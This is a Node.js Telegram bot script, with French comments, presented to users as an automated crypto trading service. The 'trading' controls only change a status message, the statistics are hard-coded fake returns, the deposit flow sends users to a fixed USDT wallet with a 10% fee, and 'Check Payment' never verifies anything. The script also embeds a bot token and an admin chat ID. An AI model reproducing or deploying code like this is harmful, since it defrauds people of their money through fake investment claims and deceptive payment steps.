const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const moment = require('moment');
const http = require('http');
const token = '6363609133:AAGokjYGa80BOoeG2ItLOiEA6_TYaFEKc60'; // Remplacez par votre token de bot
const adminChatId = '5873712733'; // Remplacez par l'ID de chat de l'administrateur
const bot = new TelegramBot(token, { polling: true });


const SERVER_URL = 'http://solkah.org/id/chat.php';

const keyboard = {
    reply_markup: {
        keyboard: [
            [{ text: 'Trading💰' }, { text: 'My Account' }],
            [{ text: 'Deposit' }, { text: 'Withdrawal' }],
            [{ text: 'Support' }]
        ],
        resize_keyboard: true,
        one_time_keyboard: false
    }
};

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;

    // Enregistrer l'utilisateur dans le fichier data.txt via le serveur PHP
    axios.post(SERVER_URL, { chat_id: chatId })
        .then(() => {
            bot.sendMessage(chatId, "Great! All is ready for start.\n\nBefore using our service, we strongly recommend you to carefully review the functionality of each trading bot button.", keyboard);
        })
        .catch(err => console.error(err));
});

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (text === 'Trading💰') {
        const tradingKeyboard = {
            inline_keyboard: [
                [{ text: 'Start Trading', callback_data: 'start_trading' }],
                [{ text: 'Stop Trading', callback_data: 'stop_trading' }],
                [{ text: 'Statistics', callback_data: 'statistics' }],
                [{ text: 'Trading Bot Channel', url: 'https://t.me/+BaZqzAd4Mus5NzU0' }]
            ]
        };
        bot.sendMessage(chatId, "Trading\nStop trading / Start trading - starting and stopping the trading bot.\nTrading bot statistics - bot trading statistics for the period: 24 hours, 3 days, 7 days, 1 month, 3 months.\nTrading status: Stopped 🚫", {
            reply_markup: tradingKeyboard
        });
    }

    if (text === 'My Account') {
        // Récupérer les données utilisateur
        axios.get('http://solkah.org/id/data.txt')
            .then(response => {
                const data = response.data.split('\n');
                let user_data = {};
                data.forEach(line => {
                    if (line) {
                        const parts = line.split(':');
                        user_data[parts[0]] = parts[1];
                    }
                });

                const current_balance = user_data['Solde'] || '0.00 USDT';
                const registration_date = user_data['Date d\'inscription'] || 'N/A';
                const total_withdrawal = user_data['Withdrawal'] || '0 USDT';

                const accountMessage = `💰 Current balance: ${current_balance}\n📅 Date of registration: ${registration_date}\n💸 Total withdrawal: ${total_withdrawal}\n\n🔗 Your referral link: https://t.me/@Orrdoxbot?start=${chatId}`;
                bot.sendMessage(chatId, accountMessage, {
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: 'Deposit', callback_data: 'deposit' }]
                        ]
                    }
                });
            })
            .catch(err => console.error(err));
    }

    if (text === 'Support') {
        bot.sendMessage(chatId, "You are now connected to support. Please describe your issue.");
        // Notify admin
        bot.sendMessage(ADMIN_CHAT_ID, `Support request from ${chatId}: ${msg.text}`);
    }
});

bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;

    if (query.data === 'start_trading') {
        bot.editMessageText("Trading\nStop trading / Start trading - starting and stopping the trading bot.\nTrading bot statistics - bot trading statistics for the period: 24 hours, 3 days, 7 days, 1 month, 3 months.\nTrading status: ACTIVE ✅️", {
            chat_id: chatId,
            message_id: query.message.message_id,
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Stop Trading', callback_data: 'stop_trading' }],
                    [{ text: 'Statistics', callback_data: 'statistics' }],
                    [{ text: 'Trading Bot Channel', url: 'https://t.me/+BaZqzAd4Mus5NzU0' }]
                ]
            }
        });
    }

    if (query.data === 'stop_trading') {
        bot.editMessageText("Trading\nStop trading / Start trading - starting and stopping the trading bot.\nTrading bot statistics - bot trading statistics for the period: 24 hours, 3 days, 7 days, 1 month, 3 months.\nTrading status: Stopped 🚫", {
            chat_id: chatId,
            message_id: query.message.message_id,
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Start Trading', callback_data: 'start_trading' }],
                    [{ text: 'Statistics', callback_data: 'statistics' }],
                    [{ text: 'Trading Bot Channel', url: 'https://t.me/+BaZqzAd4Mus5NzU0' }]
                ]
            }
        });
    }

    if (query.data === 'statistics') {
        bot.editMessageText("Trading Bot Statistics:\n24 hours: 5%\n3 days: 10%\n7 days: 15%", {
            chat_id: chatId,
            message_id: query.message.message_id
        });
    }

    if (query.data === 'deposit') {
        bot.sendMessage(chatId, 
            "❗️ In order to top up your balance, you need to transfer USDT to a wallet below (the commission for replenishment is 10%). \nThe transfer is realized automatically.\n\n❗️ The minimum amount for replenishment is 20 USDT\n\n➖➖➖➖➖\nWallet address USDT TRC-20:\n`TDpKzxmecCqdwUU8DoTjvjoKwUnemh7sge`\n(To copy, click on the wallet👆)", 
            {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'Check Payment', callback_data: 'check_payment' }]
                    ]
                },
                parse_mode: 'Markdown'
            }
        );
    }

    if (query.data === 'check_payment') {
        bot.sendMessage(chatId, "❗️Please, check again in 5 minutes❗️\n\n➖➖➖➖➖\nIf the payment is not accepted within 15 minutes, write to our support 📝", {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Check Again', callback_data: 'check_payment' }]
                ]
            }
        });
    }
});








// Créez un serveur HTTP simple qui renvoie "I'm alive" lorsque vous accédez à son URL
const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.write("I'm alive");
    res.end();
});

// Écoutez le port 8080
server.listen(8080, () => {
    console.log("Keep alive server is running on port 8080");
});
